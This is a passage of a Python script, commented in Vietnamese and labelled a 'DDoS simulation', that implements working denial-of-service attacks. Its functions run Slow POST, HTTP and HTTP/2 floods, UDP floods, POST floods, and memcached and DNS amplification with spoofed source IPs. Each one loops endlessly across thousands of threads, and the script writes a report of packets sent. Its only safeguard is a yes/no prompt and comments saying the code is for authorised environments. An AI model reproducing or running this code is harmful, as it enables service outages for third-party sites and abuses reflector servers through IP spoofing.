    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def generate_payload(size=1000):
    """Sinh payload dạng form, json hay xml ngẫu nhiên."""
    payload_type = random.choice(["form", "json", "xml"])
    if payload_type == "form":
        return {"data": ''.join(random.choice(string.ascii_letters) for _ in range(size))}
    elif payload_type == "json":
        return {"data": random_string(size), "id": random.randint(1, 10000)}
    else:
        return f"<data>{random_string(size)}</data>"

# ------------------------------
# Các hàm tấn công (Simulation)
# Các hàm dưới đây sử dụng các kỹ thuật DDoS mô phỏng
# (Chỉ dùng trong môi trường được phép)
# ------------------------------
def slow_post(targets):
    web_targets = targets["web_targets"]
    if not web_targets:
        return
    def send_slow_post(target):
        headers = generate_headers()
        headers["Content-Length"] = "10000"
        session = requests.Session()
        req = requests.Request(
            'POST', target["url"],
            headers=headers,
            data=""
        )
        prepped = session.prepare_request(req)
        logging.info(f"Sending Slow POST to {target['url']}")
        try:
            conn = session.send(prepped, stream=True, timeout=15)
            for i in range(5):  # Giảm số chunk gửi đi
                chunk = random_string(1000).encode()
                conn.send(chunk)
                logging.info(f"Sent chunk {i+1} for Slow POST to {target['url']}")
                with stats_lock:
                    stats["slow_post_requests"] += 1
                time.sleep(1)
            conn.close()
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
            logging.warning(f"Slow POST temporary error to {target['url']}: {e}")
        except Exception as e:
            logging.error(f"Slow POST critical error to {target['url']}: {e}")
            with stats_lock:
                stats["errors"] += 1

    while True:
        target = random.choice(web_targets)
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.submit(send_slow_post, target)
        time.sleep(0.2)

def http_flood(targets):
    web_targets = targets["web_targets"]
    if not web_targets:
        return
    def send_http_request(target):
        headers = generate_headers()
        params = {f"q{random.randint(1,1000)}": random_string(50)}
        try:
            response = requests.get(target["url"], headers=headers, params=params, timeout=15)
            logging.info(f"HTTP Flood sent to {target['url']}: {response.status_code}")
            with stats_lock:
                stats["http_flood_requests"] += 1
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
            logging.warning(f"HTTP Flood temporary error to {target['url']}: {e}")
        except Exception as e:
            logging.error(f"HTTP Flood critical error to {target['url']}: {e}")
            with stats_lock:
                stats["errors"] += 1

    while True:
        target = random.choice(web_targets)
        with ThreadPoolExecutor(max_workers=50) as executor:
            for _ in range(10):
                executor.submit(send_http_request, target)
        time.sleep(0.2)

def http2_flood(targets):
    web_targets = targets["web_targets"]
    if not web_targets:
        return
    def send_http2_request(target):
        context = ssl._create_unverified_context()
        conn = http.client.HTTPSConnection(target["ip"], target["port"], context=context, timeout=15)
        headers = generate_headers()
        headers.update({
            ":method": "GET",
            ":path": f"/?q={random_string(10)}",
            ":scheme": "https",
            ":authority": target["ip"]
        })
        try:
            for _ in range(25):
                conn.request("GET", f"/?q={random_string(10)}", headers=headers)
                response = conn.getresponse()
                response.read()
            logging.info(f"HTTP/2 Flood sent to {target['ip']}:{target['port']}")
            with stats_lock:
                stats["http2_flood_requests"] += 25
        except (http.client.HTTPException, TimeoutError) as e:
            logging.warning(f"HTTP/2 Flood temporary error to {target['ip']}:{target['port']}: {e}")
        except Exception as e:
            logging.error(f"HTTP/2 Flood critical error to {target['ip']}:{target['port']}: {e}")
            with stats_lock:
                stats["errors"] += 1
        finally:
            conn.close()

    while True:
        target = random.choice(web_targets)
        with ThreadPoolExecutor(max_workers=50) as executor:
            executor.submit(send_http2_request, target)
        time.sleep(0.2)

def udp_flood(targets):
    web_targets = targets["web_targets"]
    if not web_targets:
        return
    while True:
        target = random.choice(web_targets)
        packet = IP(dst=target["ip"]) / UDP(dport=random.randint(1, 65535)) / Raw(load=random_string(1400))
        try:
            send(packet, verbose=False, count=5)
            logging.info(f"UDP Flood packets sent to {target['ip']}")
            with stats_lock:
                stats["udp_flood_packets"] += 5
        except Exception as e:
            logging.error(f"UDP Flood error to {target['ip']}: {e}")
            with stats_lock:
                stats["errors"] += 1
        time.sleep(0.2)

def encrypted_request(targets):
    web_targets = targets["web_targets"]
    if not web_targets:
        return
    def send_encrypted_request(target):
        headers = generate_headers()
        payload = generate_payload(2000)
        try:
            response = requests.post(
                f"https://{target['ip']}:{target['port']}",
                headers=headers, json=payload, verify=False, timeout=15
            )
            logging.info(f"Encrypted Request sent to {target['ip']}:{target['port']}: {response.status_code}")
            with stats_lock:
                stats["encrypted_requests"] += 1
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
            logging.warning(f"Encrypted Request temporary error to {target['ip']}:{target['port']}: {e}")
        except Exception as e:
            logging.error(f"Encrypted Request critical error to {target['ip']}:{target['port']}: {e}")
            with stats_lock:
                stats["errors"] += 1

    while True:
        target = random.choice(web_targets)
        with ThreadPoolExecutor(max_workers=50) as executor:
            for _ in range(8):
                executor.submit(send_encrypted_request, target)
        time.sleep(0.2)

def memcached_amplification(targets):
    memcached_targets = targets["memcached_targets"]
    web_targets = targets["web_targets"]
    if not memcached_targets or not web_targets:
        return
    memcached = memcached_targets[0]
    if not check_server(memcached["ip"], memcached["port"]):
        logging.warning(f"Memcached server not running at {memcached['ip']}:{memcached['port']}. Skipping Memcached Amplification.")
        return
    while True:
        target = random.choice(web_targets)
        spoofed_ip = target["ip"] if random.random() < 0.8 else f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"
        packet = (IP(src=spoofed_ip, dst=memcached["ip"]) /
                  UDP(sport=random.randint(1024, 65535), dport=memcached["port"]) /
                  Raw(load="\x00\x00\x00\x00\x00\x01\x00\x00get " + random_string(20) + "\r\n"))
        try:
            send(packet, verbose=False, count=5)
            logging.info(f"Memcached Amplification packets sent to {memcached['ip']}:{memcached['port']} spoofing {spoofed_ip}")
            with stats_lock:
                stats["memcached_packets"] += 5
        except Exception as e:
            logging.error(f"Memcached Amplification error to {memcached['ip']}: {e}")
            with stats_lock:
                stats["errors"] += 1
        time.sleep(0.2)

def dns_amplification(targets):
    dns_targets = targets["dns_targets"]
    web_targets = targets["web_targets"]
    if not dns_targets or not web_targets:
        return
    dns = dns_targets[0]
    if not check_server(dns["ip"], dns["port"]):
        logging.warning(f"DNS server not running at {dns['ip']}:{dns['port']}. Skipping DNS Amplification.")
        return
    while True:
        spoofed_ip = random.choice(web_targets)["ip"]
        packet = (IP(src=spoofed_ip, dst=dns["ip"]) /
                  UDP(sport=random.randint(1024, 65535), dport=dns["port"]) /
                  DNS(rd=1, qd=DNSQR(qname=f"{random_string(10)}.example.com", qtype="TXT")))
        try:
            send(packet, verbose=False, count=5)
            logging.info(f"DNS Amplification packets sent to {dns['ip']}:{dns['port']} spoofing {spoofed_ip}")
            with stats_lock:
                stats["dns_packets"] += 5
        except Exception as e:
            logging.error(f"DNS Amplification error to {dns['ip']}: {e}")
            with stats_lock:
                stats["errors"] += 1
        time.sleep(0.2)

# ------------------------------
# Báo cáo thống kê và quản lý luồng
# ------------------------------
def generate_report():
    with stats_lock:
        report = f"""
DDoS Simulation Report - {datetime.now()}


----


Slow POST Requests: {stats['slow_post_requests']}
HTTP Flood Requests: {stats['http_flood_requests']}
HTTP/2 Flood Requests: {stats['http2_flood_requests']}
UDP Flood Packets: {stats['udp_flood_packets']}
Encrypted Requests: {stats['encrypted_requests']}
Memcached Amplification Packets: {stats['memcached_packets']}
DNS Amplification Packets: {stats['dns_packets']}
Errors: {stats['errors']}


----


"""
        logging.info(report)
        with open('ddos_report.txt', 'w') as f:
            f.write(report)

def run_attack(attack_func, name, targets, num_threads):
    try:
        max_workers = min(50, num_threads)
        num_batches = max(1, num_threads // max_workers)
        for batch in range(num_batches):
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                for _ in range(max_workers):
                    executor.submit(attack_func, targets)
            logging.info(f"Completed batch {batch+1}/{num_batches} for {name}")
        logging.info(f"{name} completed")
    except Exception as e:
        logging.error(f"{name} failed: {e}")
        with stats_lock:
            stats["errors"] += 1

# ------------------------------
# Hàm chính
# ------------------------------
def main():
    print("Mô phỏng DDoS bắt đầu (vòng lặp vô hạn). Nhấn Ctrl+C để dừng. (Chỉ dùng trong môi trường được phép)")
    print("CẢNH BÁO: Số luồng lớn (1000-200,000+) có thể làm quá tải hệ thống. Đảm bảo phần cứng đủ mạnh!")
    logging.info("Starting DDoS simulation")
    
    targets = input_targets()
    
    while True:
        num_threads = input("Nhập số luồng (tối thiểu 1000, không giới hạn tối đa): ").strip()
        if is_valid_threads(num_threads):
            num_threads = int(num_threads)
            break
        print("Số luồng không hợp lệ, phải >= 1000. Thử lại.")

    attacks = [
        (slow_post, "Slow POST"),
        (http_flood, "HTTP Flood"),
        (http2_flood, "HTTP/2 Flood"),
        (udp_flood, "UDP Flood"),
        (encrypted_request, "Encrypted Request"),
        (memcached_amplification, "Memcached Amplification"),
        (dns_amplification, "DNS Amplification")
    ]

    threads = []
    for attack_func, name in attacks:
        t = threading.Thread(target=run_attack, args=(attack_func, name, targets, num_threads))
        threads.append(t)
        t.start()

    try:
        while True:
            time.sleep(1)
            generate_report()
    except KeyboardInterrupt:
        print("Đang dừng mô phỏng...")
        logging.info("Simulation stopped by user")
        generate_report()
        sys.exit(0)

if __name__ == "__main__":
    if input("Bạn có chắc chắn đang chạy trong môi trường được phép? (y/n): ").lower() != 'y':
        print("Hủy mô phỏng. Vui lòng đảm bảo bạn có quyền chạy thử nghiệm.")
        sys.exit(1)
    main()
